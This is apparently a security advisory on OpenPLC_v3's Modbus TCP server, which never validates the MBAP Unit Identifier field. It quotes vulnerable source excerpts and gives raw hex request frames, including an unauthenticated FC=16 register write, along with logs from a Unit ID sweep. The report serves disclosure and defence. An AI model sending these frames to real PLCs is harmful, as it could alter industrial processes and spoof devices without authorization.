# Talos Vulnerability Report

## OpenPLC OpenPLC_v3 ModbusTCP server missing Unit Identifier validation vulnerability

##### CVE Number

[Pending]

##### SUMMARY

An input validation vulnerability exists in the ModbusTCP server functionality of OpenPLC _v3. The `processModbusMessage()` function never reads, validates, or filters the Unit Identifier field in the MBAP header. A specially crafted Modbus TCP request with any Unit Identifier value (0x00–0xFF) is processed and the attacker-supplied value is echoed in the response, enabling device identity spoofing in gateway deployments. An unauthenticated attacker can send a series of Modbus TCP requests to trigger this vulnerability.

##### CONFIRMED VULNERABLE VERSIONS

The versions below were either tested or verified to be vulnerable.

OpenPLC _v3 master branch (all versions using `webserver/core/modbus.cpp`)

##### PRODUCT URLS

OpenPLC_v3 - [https://github.com/thiagoralves/OpenPLC_v3](https://github.com/thiagoralves/OpenPLC_v3)

##### CWE

CWE-20 - Improper Input Validation

##### DETAILS

OpenPLC is an open-source programmable logic controller (PLC) designed to provide a low cost option for automation. The platform consists of two parts: the Runtime and the Editor. The Runtime can be deployed on a variety of platforms including Windows, Linux, and various microcontrollers. Common uses for OpenPLC include home automation and industrial security research. OpenPLC supports communication across a variety of protocols, including Modbus and EtherNet/IP.

An input validation defect exists in OpenPLC's handling of the MBAP (Modbus Application Protocol) header. The MBAP header in Modbus TCP consists of 7 bytes:

```
Byte 0-1: Transaction Identifier
Byte 2-3: Protocol Identifier (0x0000 = Modbus)
Byte 4-5: Length (number of following bytes)
Byte 6:   Unit Identifier    ← THIS FIELD IS NEVER VALIDATED
Byte 7+:  PDU (Function Code + Data)
```

Per the MODBUS Messaging on TCP/IP Implementation Guide V1.0b, Section 4.2, the Unit Identifier is used for intra-system routing to address specific devices behind a Modbus TCP-to-RTU gateway. A conformant server should only process requests addressed to its own Unit ID.

OpenPLC's `processModbusMessage()` begins parsing at `buffer[7]` (the Function Code) and completely skips `buffer[6]` (the Unit Identifier). The field is not read into any variable, not compared against any configured value, and not logged.

When a Modbus TCP client connects to port 502, `startServer()` accepts the connection and spawns a handler thread. The handler calls `processMessage()` ([1]):

```
void processMessage(unsigned char *buffer, int bufferSize, int client_fd, int protocol_type)
{
    int messageSize = 0;
    if (protocol_type == MODBUS_PROTOCOL)
    {
        messageSize = processModbusMessage(buffer, bufferSize);  // [1]
    }
    while (messageSize > 0)
    {
        ssize_t bytesWritten = write(client_fd, buffer, messageSize);  // [2]
        // ...
    }
}
```

At [2], the response is sent using the same `buffer` that contained the original request. Since `buffer[6]` (Unit Identifier) is never modified by any processing function, the attacker's value is echoed verbatim in the response.

Inside `processModbusMessage()`, parsing begins at `buffer[7]`. `buffer[6]` is never referenced ([3]):

```
int processModbusMessage(unsigned char *buffer, int bufferSize)
{
    MessageLength = 0;
    uint16_t field1 = (uint16_t)buffer[8] << 8 | (uint16_t)buffer[9];   // [3a] starts at buffer[8]
    uint16_t field2 = (uint16_t)buffer[10] << 8 | (uint16_t)buffer[11]; // [3b]
    uint8_t flag = buffer[10];                                           // [3c]
    uint16_t len = (uint16_t)buffer[11] << 8 | (uint16_t)buffer[12];    // [3d]
    void *value = &buffer[13];                                           // [3e]
    void *endianness_check = &buffer[8];                                 // [3f]

    // *** buffer[6] (Unit Identifier) is NEVER read, checked, or stored ***

    if (bufferSize < 8)
    {
        ModbusError(buffer, ERR_ILLEGAL_FUNCTION);
    }
    else if(buffer[7] == MB_FC_READ_COILS)             // FC=1
    {
        ReadCoils(buffer, bufferSize);
    }
    // ... 12 more function code branches, ALL skip buffer[6] ...
    else if(buffer[7] == MB_FC_WRITE_MULTIPLE_REGISTERS) // FC=16
    {
        WriteMultipleRegisters(buffer, bufferSize);      // [4] no Unit ID check
    }
    // ...
}
```

The response functions also never modify `buffer[6]`. For example, `ModbusError()` ([5]):

```
void ModbusError(unsigned char *buffer, int mb_error)
{
    buffer[4] = 0;
    buffer[5] = 3;
    buffer[7] = buffer[7] | 0x80;
    buffer[8] = mb_error;
    MessageLength = 9;
    // buffer[6] (Unit ID) is untouched — attacker's value persists  // [5]
}
```

Additionally, while OpenPLC provides Slave ID configuration for its Modbus *Master* role (outbound polling via `webserver.py`), the Modbus *Server* (TCP/502 listener) has no configurable device address — not in the web UI, database, configuration files, or source code.

```
# webserver.py (line 307) — Modbus Master configuration
mbconfig += 'device' + str(device_counter) + '.slave_id = "' + str(row[3]) + '"\n'
```

There is no equivalent server-side configuration.

Knowing this, an attacker can send an FC=16 request with any Unit Identifier value and it will be processed. The following request writes to register `0x0064` with value 260, using Unit ID `0x07`:

```
TX: 00 01 00 00 00 09 07 10 00 64 00 01 02 01 04
                      ^^
                  unit_id=0x07 (not the PLC's address)

RX: 00 01 00 00 00 06 07 10 00 64 00 01
                      ^^
                  unit_id=0x07 ECHOED — server claims to be device 7
```

In a gateway deployment, this causes the gateway to believe PLC #7 responded successfully, even though the request was actually processed by a different OpenPLC instance that does not check its own address.

To verify the vulnerability, a test environment was set up with OpenPLC v3 running in a Docker container (debian:trixie). A Python script sent FC=16 requests with various Unit Identifier values and verified the write succeeded via FC=03 read-back.

**Core attack** — write with non-default Unit ID (0x07):

```
TX: 00 03 00 00 00 09 07 10 00 64 00 01 02 01 04
RX: 00 03 00 00 00 06 07 10 00 64 00 01

Result: Register 0x0064 overwritten: 180 → 260 (confirmed via FC=03 read-back)
        Unit ID 0x07 echoed in response
```

**Unit ID sweep** — five different values tested:

```
Unit ID 0x01 (default):    FC=16 write ✓  response UID=0x01 (echoed)  read-back=101
Unit ID 0x07 (non-default): FC=16 write ✓  response UID=0x07 (echoed)  read-back=107
Unit ID 0x00 (broadcast):  FC=16 write ✓  response UID=0x00 (echoed)  read-back=100
Unit ID 0xFF (wildcard):   FC=16 write ✓  response UID=0xFF (echoed)  read-back=355
Unit ID 0x42 (arbitrary):  FC=16 write ✓  response UID=0x42 (echoed)  read-back=166
```

All five Unit Identifier values are accepted and echoed, confirming zero validation is performed across the entire 0x00–0xFF range. All 13 supported function codes are affected because the bypass occurs in `processModbusMessage()` before function code dispatch.
